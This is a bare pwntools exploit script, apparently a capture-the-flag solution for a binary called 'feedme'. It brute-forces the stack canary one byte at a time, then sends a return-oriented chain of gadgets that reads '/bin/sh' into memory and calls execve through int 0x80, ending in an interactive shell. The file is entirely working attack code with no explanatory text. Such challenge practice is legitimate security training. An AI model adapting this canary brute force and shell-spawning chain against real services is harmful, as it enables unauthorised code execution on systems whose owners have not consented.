from pwn import *
#context.log_level = 'debug'

r = process('./feedme')

r.recvuntil('FEED ME!\n')
canary = ''

for i in range(33, 37):
	for j in range(0x00, 0xff):
		payload = chr(i)
		payload += 'A'*32
		payload += canary
		payload += chr(j)
		
		r.send(payload)
		data = r.recvuntil('FEED ME!\n')
		
		if 'YUM' in data:
			print data
			canary += chr(j)
			log.info('Found : '+chr(j)+' & Canary : '+canary)
			break

pax = 0x080bb496
pdbx = 0x0806f370
int80 = 0x0806fa20
bss = 0x080eaf80

payload2 = 'A'*32
payload2 += canary
payload2 += 'A'*12

payload2 += p32(pax)
payload2 += p32(0x3)

payload2 += p32(pdbx)
payload2 += p32(0x8)
payload2 += p32(bss)
payload2 += p32(0)
payload2 += p32(int80)

payload2 += p32(pax)
payload2 += p32(0xb)

payload2 += p32(pdbx)
payload2 += p32(0)
payload2 += p32(0)
payload2 += p32(bss)
payload2 += p32(int80)

r.send(chr(len(payload2)))
r.send(payload2)
r.send("/bin/sh\x00")
r.interactive()
